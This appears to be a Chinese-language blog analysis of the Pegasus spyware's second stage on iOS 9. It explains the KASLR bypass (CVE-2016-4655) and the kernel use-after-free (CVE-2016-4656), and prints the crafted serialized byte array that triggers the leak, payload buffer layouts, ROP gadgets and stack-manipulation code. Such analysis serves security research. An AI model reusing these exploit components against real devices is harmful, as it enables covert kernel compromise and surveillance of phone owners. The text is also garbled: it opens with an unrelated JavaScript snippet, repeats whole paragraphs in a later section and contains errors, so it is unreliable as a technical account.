<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>._proto_._proto_=<span class="literal">null</span>;</span><br><span class="line">x=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">x._proto_._proto_._proto_=<span class="built_in">window</span>;</span><br><span class="line">x.Audio;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="绕过KASLR"><a href="#绕过KASLR" class="headerlink" title="绕过KASLR"></a>绕过KASLR</h2><h3 id="注入的第二阶段：内核位置泄露"><a href="#注入的第二阶段：内核位置泄露" class="headerlink" title="注入的第二阶段：内核位置泄露"></a>注入的第二阶段：内核位置泄露</h3><p>第二阶段依靠一个内核信息泄露漏洞（CVE-2016-4655），为接下来实现越狱的内核存储污染漏洞（CVE-2016-4656）做准备。</p>
<h3 id="分析KASLR绕过"><a href="#分析KASLR绕过" class="headerlink" title="分析KASLR绕过"></a>分析KASLR绕过</h3><p>阶段二进行提权，为iphone越狱做准备。Pegasus准备了两套方案。方案一为IOS内核爆破。方案二为找出已经越狱的iphone（已经安装了后门程序），利用已存在的后门来安装Pegasus的内核补丁包。</p>
<p>首先，必须确定内核在内存中的位置，提升自己的权限，解除保护机制，然后安装越狱软件。为了波及更多iphone，Pegasus准备了32位和64位的包。这两个包可以波及大约19个iPhone版本。阶段二的变种在设计上有许多的相似性，但各自的目的不同，所以最好相关又隔离地看待变种。接下来会讲解阶段二变体的每一个部分，并且会指出变种相似的地方。</p>
<h4 id="32位和63位二进制包不同的地方"><a href="#32位和63位二进制包不同的地方" class="headerlink" title="32位和63位二进制包不同的地方"></a>32位和63位二进制包不同的地方</h4><p>32位包应用于老款的iPhone（iPhone4s–iPhone5c），目标版本为IOS 9.0到IOS 9.3.3。64位应用于新款iPhone（iPhone5s–最新款），目标版本也是IOS 9.0到IOS 9.3.3。两个二进制包执行类似的步骤，利用相同的漏洞。但是，利用漏洞的方式因版本的不同而不同。在运行机制不同的地方，进行分别各自的处理。</p>
<h4 id="加载API"><a href="#加载API" class="headerlink" title="加载API"></a>加载API</h4><p>想要阶段二成功，需要获得大量的API函数。为保证函数可用，阶段二通过<strong>dlsym</strong>动态加载需要的API地址。虽然动态读取API地址在恶意软件上很常见，但有趣的是制作者多次重复加载许多的API函数。仅在<strong>main</strong>函数上，加载了大量的API地址，但只使用一小部分的API（例如，<strong>socket</strong>函数加载到了内存中，却一直没有使用）。在加载了初期的API函数后，32位包调用了一个子进程（初始化），这个进程又会轮流调用其他几个子进程，每个进程负责加载其他的API函数，除此之外，执行不同的启动项任务。</p>
<p>分类加载API函数（哪个阶段二函数会加载哪个API函数），还有重复加载大量API，表明加载API是一些独立组件或者操作独有的。例如，一些函数负责解压越狱文件，利用<strong>chmod</strong>改变权限，将文件放在受害者iPhone上正确的地方。一个独立函数会加载执行这些操作的API函数。这个函数只会加载那些有用的API，而这些API不会和阶段二其他部分共享。</p>
<p>由于在整个二进制文件中大量使用调试日志，阶段二的分析也变得更加容易。对日志记录子系统的调用通常引用漏洞开发人员使用的原始文件名。这些调试代码的出现至少表明有以下独立模块（或子系统）存在：</p>
<ol>
<li><strong>fs.c</strong> 加载跟文件还有文件系统操作方法例如<em>ftw,open,read,rename,mount</em>有关的API</li>
<li><strong>kaslr.c</strong> 加载API，如<em>IORegistryEntryGetChildIterator,IORegistryEntryGetProperty,IOServiceGetMatchingService</em>，通过利用<em>io _ service _ open _ extended</em>函数中的漏洞，这些API来找到内核地址。</li>
<li>**bh.c ** 加载与下个阶段payloads相关的API，以及与放置文件正确位置相关的API，如 <em>BZ2 _ bzDecompress, chmod, and malloc</em></li>
<li>*<em>safari.c ** 加载如</em>sync, exit, strcpy*API，这些API用来清除Safari缓存文件以及终止进程。当攻击完成且完全退出后，这些清除工作才会开始，所以Safari崩溃清除（阶段一中说明的）就不会发生。</li>
</ol>
<p>上述部分说明阶段二是基于模块化理念设计的，至少，由不同代码源文件组成。这些不同成分很可能在iOS攻击链中可重复使用。</p>
<h4 id="环境设置和平台确定"><a href="#环境设置和平台确定" class="headerlink" title="环境设置和平台确定"></a>环境设置和平台确定</h4><p>在初始化完成后，阶段二调用了一个全局回调函数，因错误阶段二终止时就会调用这个函数。根据写入器中的文件名，这个函数可能是一个断言样式回调。</p>
<p>为了确定受害者设备的型号，调用了<em>sysctlbyname</em>获得<em>hw.machine</em>。另一个对<em>sysctlbyname</em>获取*kern.osversion *信息。完成这两项后，阶段二可以精确确定型号和iOS 内核版本。根据这两个信息，找到定义不同内存偏移量的数据库，阶段二依据这个库来爆破设备。如果阶段二找不到适合设备的数据库，进程会执行这个断言回调并退出。</p>
<p>阶段二在运行时使用一个锁定文件。作为运行环境设置的一部分，阶段二为这个文件创建文件名和全局目录变量–<em>$HOME/tmp/lock</em>（注意：*$HOME*是一个程序独有变量）</p>
<p>32位包支持100个手机型号和iOS版本组合项。同样，64位包支持99个手机型号和iOS版本组合项。</p>
<h4 id="攻入KASLR"><a href="#攻入KASLR" class="headerlink" title="攻入KASLR"></a>攻入KASLR</h4><p>阶段二的大部分功能是用来操纵内核以使受害设备防御系统失效。想要控制内核，必须先知道内核的位置。因为iOS使用的KASLR机制，通常情况下内核会映射到一随机地址。KASLR在用户每一次开机后将内核映射到一伪随机地址来阻止进程定位内存中内核地址。要找到内核，阶段二必须找到办法将内核空间的一个地址暴露到用户内存空间中。阶段二利用<strong>CVE-2016-4655</strong>找到内核空间中的一个内存地址。</p>
<p>阶段二首先在IOKit 子系统上开放了一个端口来找到内核。如果失败，调用断言回调并退出。阶段二创建了一个叫<strong>AppleKeyStore</strong>的服务并调用<strong>IOServiceMatching</strong>，调用结果返回到<strong>IOServiceGetMatchingService **，得到</strong>io _ service _ t<strong>对象，这个对象包含攻击者想要的已注册的IOKit IOService（即 AppleKeyStore）。有了这个IOService句柄，阶段二调用</strong>io_service_open_extended<strong>并将一段精心制作的属性字段传到服务中。这个字段是</strong>XML<strong>数据的串行化二进制表示，</strong>io_service_open_extended<strong>会将数据最终传到内核中的</strong>OSUnserializeBinary<strong>函数。</strong>OSUnserializeBinary<strong>里是一个转化语句，处理二进制XML数据结构中的不同种类的数据。</strong>kOSSerializeNumber**类型的数据会随便接受一定长度的数据而没有任何的数据边界审核，最终会使调用者获得比允许的更多的内存空间。因为下面这段代码，这种情况得以发生。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">len=(key &amp; kOSSerializeDataMask);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> kOSSerializeNumber:</span><br><span class="line">												bufferPos += <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line">												<span class="keyword">if</span>(bufferPos&gt;bufferSize) <span class="keyword">break</span>;</span><br><span class="line">												value=next[<span class="number">1</span>];</span><br><span class="line">												value&lt;&lt;=<span class="number">32</span>;</span><br><span class="line">												value |= next[<span class="number">0</span>];</span><br><span class="line">												o = OSNumber::withNumber(value. len);</span><br><span class="line">												next+=<span class="number">2</span>;</span><br><span class="line">													<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>问题是<strong>len</strong>变量在传送到<strong>OSNumber::withNumber</strong>前是无效的。最终，<strong>OSNumber::init</strong>被调用，其会盲目信任用户控制的值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">OSNumber::init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> inValue, <span class="keyword">unsigned</span> <span class="keyword">int</span> newNumberofBits )</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!super::init())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	size=newNumberOfBits;</span><br><span class="line">	value=(inValue &amp; sizeMask);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个漏洞让阶段二可以控制OSNumber的大小。<strong>io_service_open_extended</strong>为<strong>OSUnserializedBinary</strong>准备好了使用环境，通过<strong>OSUnserializedBinary</strong>来利用漏洞。在怎么利用前，先来看看传送到<strong>io_service_open_extended</strong>的恶意**properties **字段。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> properties[]=&#123;</span><br><span class="line">	<span class="comment">//kOSSerializeBinarySignature</span></span><br><span class="line">	<span class="number">0xD3</span>, <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//kOSSerializeEndCollecton | kOSSerializeDictionary | 2</span></span><br><span class="line">	<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x81</span>,</span><br><span class="line">	<span class="comment">//KEY 1 specified as 30 bytes long (0x1E)</span></span><br><span class="line">	<span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line">	<span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line">	<span class="string">&quot;HIDKeyboardModifierMappingSrc&quot;</span>, <span class="number">0x00</span>,    <span class="comment">//(30 bytes)</span></span><br><span class="line">	<span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//VALUE 1</span></span><br><span class="line">	<span class="comment">//kOSSerializeNumber specified as 0x800 bits (256 bytes)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,</span><br><span class="line">	<span class="comment">//value of OSNumber(4)</span></span><br><span class="line">	<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//KEY 2 specified as bytes long (0x1E)</span></span><br><span class="line">	<span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line">	<span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line">	<span class="string">&quot;HIDKeyboardModifierMappingDst&quot;</span>,<span class="number">0x00</span>,    <span class="comment">//(30 chars)</span></span><br><span class="line">	<span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//VALUE 2</span></span><br><span class="line">	<span class="comment">//kOSSerializeEndCollecton | kOSSerializeNumber | 32</span></span><br><span class="line">	<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x84</span>,</span><br><span class="line">	<span class="comment">//value of OSNumber(0x193)</span></span><br><span class="line">	<span class="number">0x93</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>阶段二调用<em>IORegistryEntryGetProperty <em>来找到</em>HIDKeyboardModifierMappingSrc</em>的入口点，导致<strong>properties</strong>数组创建了超过最大值64bit的<strong>OSNumber</strong>值。阶段二用下列代码调用<em>is_ io_registry_entry_get_property_bytes</em>，这个函数会读取内核栈区的末尾值并将读到的数据备份到内核堆区中。接着<strong>IORegistryEntryGetProperty</strong>这个函数会将这段堆缓冲区返回到用户空间中。因此，栈头部指针会被用户读取，接着利用这个指针来计算iOS内核基址：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;<span class="keyword">while</span> (IORegistryEntryGetProperty_0(v13, <span class="string">&quot;HIDKeyboardModifierMappingSrc&quot;</span>,dataBuffer,&amp;size)</span><br><span class="line">);</span><br><span class="line">writeLog(<span class="number">7</span>,<span class="string">&quot;%.2s%5.5d\n&quot;</span>,<span class="string">&quot;kaslr.c&quot;</span>,<span class="number">127</span>);</span><br><span class="line"><span class="keyword">if</span>(size&gt;<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">	writeLog(<span class="number">7</span>,<span class="string">&quot;%.2s%5.5d\n&quot;</span>,<span class="string">&quot;kaslr.c&quot;</span>,<span class="number">138</span>);</span><br><span class="line">	<span class="keyword">return</span> dataBuffer[index]&amp;<span class="number">0xFFF00000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要特别注意这段代码的两个方面。第一，properties数组指定<strong>OSNumber</strong>的值是256字节大小，这个值会最终导致数据泄露。第二，<em>index</em>值会因型号和iOS版本不同而不同，这个值存储在<em>dataBuffer</em>中，用来找到内存地址。阶段二的开发者已经规划了每个型号和iOS版本的组合项，确定<em>dataBuffer</em>那个地址值是有效的内核地址。</p>
<p>如果上述方法不足以找到内核基址或者发现iOS版本不是9，断言回调启动程序终止。</p>
<h4 id="在受害设备上建立读-写-执行原语（32bit）"><a href="#在受害设备上建立读-写-执行原语（32bit）" class="headerlink" title="在受害设备上建立读/写/执行原语（32bit）"></a>在受害设备上建立读/写/执行原语（32bit）</h4><p>找到内核基址后，阶段二的32包通过pipe函数生成一个IPC。如果pipe命令失败，就会停止攻击。生成IPC后，32包用一个内核端口得到时钟服务，通过<strong>host_get_clock_service</strong>得到电池时钟（著名的日历时钟）和实时时钟。如果任一时钟不可达，攻击就会停止。因为接下来用这三个对象（pipe set和两个时钟对象）获取内核读写执行权限，所以这三个对象非常重要。</p>
<p>紧跟着<em>pipe</em>和<em>host_get_clock_service calls</em>，32包检查向前通过<strong>task_from_pid</strong>创建的内核端口值。如果<strong>task_from_pid</strong>返回了一个有效值（不是NULL），32包用<em>vm_write</em>写入20字节的数据块，来修改内核空间。这个20字节数据覆盖了<em>clock_ops</em>的一部分。</p>
<p>当调用例如<em>clock_get_attributes</em>函数时，内核会调用电池时钟和实时时钟相关的函数，这个20字节数据就包含了这些函数的指针。数据块用现存的内核函数替代了两种时钟类型的<em>getattr</em>操作语。特别的是，实时时钟的<em>getattr</em>被修改成指向<strong>OSSerializer::serialize</strong>的指针，电池时钟的<em>getattr</em>改成指向<strong>_bufattr_cpx</strong>的指针。</p>
<p>当两个时钟调用<em>clock_get_attributes</em>时，会改变其原有的执行结果。例如电池时钟调用<em>clock_get_attributes</em>时，相当与调用了内核空间读函数。<strong>_bufattr_cpx</strong>只有两个属性：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_bufattr_cpx:</span><br><span class="line">			LDR        R0,[R0]</span><br><span class="line">			BX          LR</span><br></pre></td></tr></table></figure>

<p>R0里存储着一个内存地址，这是这个函数读取的，在返回调用函数前写入R0中。iPhone基于ARM框架的函数调用使用寄存器存储前四个函数参数，虽然<strong>getattr</strong>使用了三个参数，但缺少完全兼容的函数原型没有关系。</p>
<p>替代了实时时钟<strong>getattr</strong>的函数更加复杂。<strong>OSSerializer::serialize</strong>函数将<em>OSSerializer <em>对象（包含虚函数表（vtable））作为</em>this</em>指针。函数调用* OSSerializer *对象0x10处的地址并通过BX命令来摆脱控制，向下一个函数传入DWORDs里8和12偏移处的值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">_DWORD <span class="title">OSSerializer::serialize</span><span class="params">(OSSerialize *)</span>:</span></span><br><span class="line">		LDR      R3,[R0,#8]</span><br><span class="line">		MOV    R2,R1</span><br><span class="line">		LDR      R1,[R0,#<span class="number">0xC</span>]</span><br><span class="line">		LDR.W  R12,[R0,#<span class="number">0x10</span>]</span><br><span class="line">		MOV     R0,R3</span><br><span class="line">		BX         R12</span><br></pre></td></tr></table></figure>
<p>通过一段特殊设计的数据块，接下来会详细谈到，现在调用<em>clock_get_attributes</em>就可以在内核内执行任意函数。如果受害者的内核已经以某种方式暴露了，这种时钟修改才可能发生，这是值得注意的。所以，如果在一个没有越狱的手机上，修改可能不成功。</p>
<p>如果32包已经获得了内核端口并且完成了上述对不同时钟的修改，会略过接下来的几个步骤，获取访问权，逐步提升权限。如果因现阶段内核端口不可用，使内核修改失败，32包创建并锁向前初始化阶段的锁定文件。这个文件非常重要，因为后面获得内核改写权限会使用这个文件。</p>
<p>64位包不会利用已越狱手机上的后门。</p>
<h4 id="线程操作"><a href="#线程操作" class="headerlink" title="线程操作"></a>线程操作</h4><p>为在内核中执行任意代码，最终阶段二会利用一个UFA（use after free）漏洞。当间接引用的内存区域（漏洞想要控制的）在漏洞利用开始前分配给了另一个线程，这时竞争状况产生了。其他线程可能突然申请一段重要的已释放区域，为降低这种可能性，阶段二会创建非常多的线程，并立刻将每个线程（主线程之外的）暂停。接着，阶段二为主线程修改时刻表策略，使利用UAF时不会碰到内存竞争占用的情况的可能性大大增加。</p>
<p>阶段二64位版本中还有额外的一个步骤。在线程时刻表修改完成后，阶段二会创建1000个线程。每个线程都含有一个单紧环，这个循环等待全局变量降至预定义值以下（值小于0）。这是为了确保（至少，增加可能性）没有其他的线程会争夺UFA目标内存块。</p>
<h4 id="建立通信隧道（32位）"><a href="#建立通信隧道（32位）" class="headerlink" title="建立通信隧道（32位）"></a>建立通信隧道（32位）</h4><p>阶段二32包利用pipe命令创建另一个<em>pipe</em>，重新使用原先生成的<em>pipe</em>的变量。在调用<em>host_get_clock_service</em>之后，这个命令立刻执行，以获得实时和电池时钟。因这个pipe，<em>host_get_clock_service</em>再使用了之前为获得不同时钟端口<em>host_get_clock_service</em>使用的变量。</p>
<p>先前生成的<em>pipe</em>和时钟端口非常关键，因为接下来的内核操作会用到，如果内核任务端口早已可得，<strong>32Stage2</strong>会略过这个对修改内核很重要的过程而是直接调用<em>vm_write</em>来修改内核。然而，如果<strong>32Stage2</strong>没有得到内核任务端口（手机没有越狱的情况），漏洞利用就很重要。作为攻击的一部分，32Stage2在攻击前向要获得<em>pipe</em>组和时钟，因此二进制包可以确保获得。尽管没必要重复，这是为确保重要的对象可达。</p>
<p>假定用于最终调用函数的触发机制只不过是将现有函数指针重定向到sysctl处理程序，64位包不用执行这一步骤。</p>
<h4 id="payload构造和内核插入"><a href="#payload构造和内核插入" class="headerlink" title="payload构造和内核插入"></a>payload构造和内核插入</h4><p>如果不能通过内核端口修改内核存储空间，<strong>32Stage2</strong>必须利用iOS已存漏洞去控制内核。其构造了两个数据缓冲块：包含修改实时和电池时钟的20字节的关键覆盖数据和38字节的一段payload，会运行一系列小程序来安装时钟覆盖程序。如下：<br><strong>clock_ops_overwrite</strong> 缓存区：</p>
<pre><code>[00] (rtclock.getattr):address of OSSerializer::serialize
[04] (calend_config):NULL
[08] (calend_init):NULL
[0C] (calend_gettime):address of calen_gatattr
[10] (calend_getattr):address of _bufattr_cpx</code></pre>
<p><strong>uaf_payload_buffer</strong>攻击利用的缓存区：</p>
<pre><code>[00] ptr to clock_ops_overwrite buffer
[04] address of clock_ops array in kern memory
[08] address of _copyin
[0C] NULL
[10] address of OSSerializer::serialize
[14] address of &quot;BX LR&quot; code fragment
[18] NULL
[1C] address of OSSymbol::getMetaClass
[20] address of &quot;BX LR&quot; code fragment
[24] address of &quot;BX LR&quot; code fragment</code></pre>
<p><strong>32Stage2</strong>创建一个新线程来处理安装一新的时钟处理程序所需要的初始操作，但这个新线程不会进行安装。这个线程在栈上创建<strong>kauth_filesec</strong>数据块：</p>
<pre><code>.fsec_magic=KAUTH_FILESEC_MAGIC; //0x12CC16D
.fsec.owner=&lt;undetermind, random stack value&gt;;
.fsec.group=&lt;undetermind, random stack value&gt;;
.fsec_acl.entrycount=KAUTH_FILESEC_NOACL;//-1</code></pre>
<p><em>uaf_payload_buffer</em>添加到<em>kauth _filesec</em>中的*<em>kauth_filesec.fsec_acl.acl_ace[]**数组末尾处。这个会在IOKit上开设一个端口，为AppleKeyStore调用I</em>OServiceGetMatchingService*。该线程利用与获取内核地址相同的方法，获得一段有效的内核内存空间。新线程和之前相同操作不同之处在于属性名称不同（新线程使用“ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara”）。</p>
<p>接着，<strong>open_extended *<em>调用</em>syscall*。32包将锁定文件的地址传到syscall，还有KAUTH_UID_NONE和KAUTH_GID_NONE两个参数值，在线程开始时，创建</strong>kauth_filesec<strong>。</strong>open_extended**会执行下列代码：</p>
<pre><code>if ((uap-&gt;xsecurity!=USER_ADD_NULL)&amp;&amp;
    ((ciferrror=kauth_copyinfilesec(uap-&gt;xsecurity,&amp;xsecdst))!=0))</code></pre>
<p><strong>kauth_copyinfilesec</strong>从用户块中复制<strong>kauth_filesec **到内核块中的</strong>kauth_filesec <strong>数据块中。</strong>kauth_filesec **制作了一个访问控制列表(acl)包含访问控制入口(ace)。如下：</p>
<pre><code>/* FILE SECURITY information */
struct kauth_filesec&#123;
    u_int32_t        fsec_magic;
    guid_t            fsec_owner;
    guid_t            fsec_group;
    struct kauth_acl fsec_acl;
&#125;；</code></pre>
<p>ACL储存在<strong>kauth_acl</strong> ，如下：</p>
<pre><code>/* Access Contro List */
struct kauth_acl&#123;
    u_int32_t        acl_entrycount;
    u_int32_t        acl_flags;
    struct kauth_ace acl_ace[1];
&#125;;</code></pre>
<p><strong>kauth_ace</strong>有24字节，如下：</p>
<pre><code>typedef u_int32_t kauth_ace_rights_t;
/* Access Control List Entry (ACE) */
struct kauth_ace&#123;
    guid_t        ace_applicable;
    u_int32_t    ace_flags;
    kauth_ace_rights_t    ace_rights;                    /*scope specific*/
&#125;;</code></pre>
<p><strong>kauth_acl</strong>里的<strong>acl_entrycount</strong>是一个无符号整型，定义了acl_ace数组里有多少个<strong>kauth_ace</strong>入口。如果ACL里没有ACE记录，acl_entrycount会定义为KAUTH_FILESEC_NOACL，这个值为-1。在<strong>kauth_copyinfilesec</strong>中发现如下注释。</p>
<pre><code>/* 
    猜测filesec的大小。从基指针开始，
    看看还有页面上还有多少空间剩余，
    裁剪到合理的上界。如果空间不够，
    重新基于实际ACL空间大小定义，重新开始。

    上届值必须小于KAUTH_ACL_MAX_ENTRIES。
    但可任意取值，0也可以。
*/</code></pre>
<p>当该线程构建了kauth_filesec，会直接操控栈上的数据块地址，如下：</p>
<pre><code>//get stack address
p=(unsigned int)&amp;stackAnchor &amp; 0xFFFFFF000;
//kauth_filesec.fsec_magic
(p+0xEC0)=0x12CC16D;
//kauth_filesec.fsec_acl.entrycount=KAUTH_FILESEC_NOACL
(p+0xEE4)=-1;
//kauth_filesec.fsec_acl.acl_ace[...]
memcpy(&amp;stackAnchor &amp; 0xFFFFF000 | 0xEEC, pExploit, 128);</code></pre>
<p>堆栈在新线程执行开始时内容如下：</p>
<pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1
unsigned int size; //[sp+2020h] [bp-2013h]@12
char buffer[4096]; //[sp+2024h] [bp-102h]@12
int v26; //[sp+3024h] [bp-2Ch]@7
mach_port_t connection; //[sp+3028h] [hp-28h]@4
kern_return_t result; //[sp+320Ch] [bp-24h]@4
mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre>
<p>该新线程利用<em>stackAnchor</em>变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个<em>kauth_filesec</em>结构块，其包含了比必需的更多的信息。通过设置<strong>acl_entrycount</strong>去向系统说明没有ACE项，则当<em>open_extended <em>加载</em>kauth_filesec</em>时，其不会解析<em>acl _ flags <em>以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终</em>open_extended</em>会将攻击缓冲区（以及*clock _ ops _ overwrite *缓冲区）的内容复制到内核区域中。</p>
<p>新线程利用<em>open_extended <em>的漏洞将未修改的</em></em>payload<strong>放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到</strong>payload<strong>的地址。当完成了对</strong>AppleKeyStore*<em>漏洞的攻击，</em>buffer <em>变量传向</em>io_service_open_extended <em>（位于stackAnchor附近的相同变量）。这意味着</em>AppleKeyStore <em>会返回指向内核块的指针，指针指向</em>open_extended *复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。</p>
<p>一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。</p>
<p>在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。</p>
<h4 id="payload结构和内核插入（64位）"><a href="#payload结构和内核插入（64位）" class="headerlink" title="payload结构和内核插入（64位）"></a>payload结构和内核插入（64位）</h4><p>考虑到<em>64Stage2</em>中使用的触发机制的不同，设置和<em>payload</em>结构也有点不同的。64位没有创建管道和覆盖时钟<em>getattr</em>语句，而是重写了一<em>sysctl <em>处理函数，最终也会导致</em></em> OSSerializer::serialize<strong>以32位相似方式执行。为建立执行原语，64位用到了</strong>net.inet.ip.dummynet.extract_heap*<em>的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和</em>getattr*差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。</p>
<h4 id="建立内核读-写基元（32位）"><a href="#建立内核读-写基元（32位）" class="headerlink" title="建立内核读/写基元（32位）"></a>建立内核读/写基元（32位）</h4><p>利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的<strong>clock_ops</strong>处理程序，该程序可使用户可以访问内核内存。32Stage2在<em>io_service_open_extended</em>反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了<em>io_service_open_extended</em>的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当<em>io_service_open_extended</em>传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。</p>
<p>properties参数中的数据<strong>blob</strong>表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。</p>
<p>在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。</p>
<pre><code>len = (key &amp; kOSSerializeDataMask);
...
switch ( kOSSerializeTypeMask &amp; key)
&#123;
    case kOSSerializeDictionary:
        o = newDict = OSDictionary::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeArray:
        o = newArray =OSArray::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeSet:
        o = newSet = OSSet::withCapacity(len);
        newCollect = (len!=0);
    case kOSSerializeObject;
        if(len&gt;=objsIdx) break;
        o = objsArray[len];
        o-&gt;retain();
        isRef = true;
        break;
&#125;</code></pre>
<p>堆栈在新线程执行开始时内容如下：</p>
<pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1
unsigned int size; //[sp+2020h] [bp-2013h]@12
char buffer[4096]; //[sp+2024h] [bp-102h]@12
int v26; //[sp+3024h] [bp-2Ch]@7
mach_port_t connection; //[sp+3028h] [hp-28h]@4
kern_return_t result; //[sp+320Ch] [bp-24h]@4
mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre>
<p>该新线程利用<em>stackAnchor</em>变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个<em>kauth_filesec</em>结构块，其包含了比必需的更多的信息。通过设置<strong>acl_entrycount</strong>去向系统说明没有ACE项，则当<em>open_extended <em>加载</em>kauth_filesec</em>时，其不会解析<em>acl _ flags <em>以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终</em>open_extended</em>会将攻击缓冲区（以及*clock _ ops _ overwrite *缓冲区）的内容复制到内核区域中。</p>
<p>新线程利用<em>open_extended <em>的漏洞将未修改的</em></em>payload<strong>放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到</strong>payload<strong>的地址。当完成了对</strong>AppleKeyStore*<em>漏洞的攻击，</em>buffer <em>变量传向</em>io_service_open_extended <em>（位于stackAnchor附近的相同变量）。这意味着</em>AppleKeyStore <em>会返回指向内核块的指针，指针指向</em>open_extended *复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。</p>
<p>一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。</p>
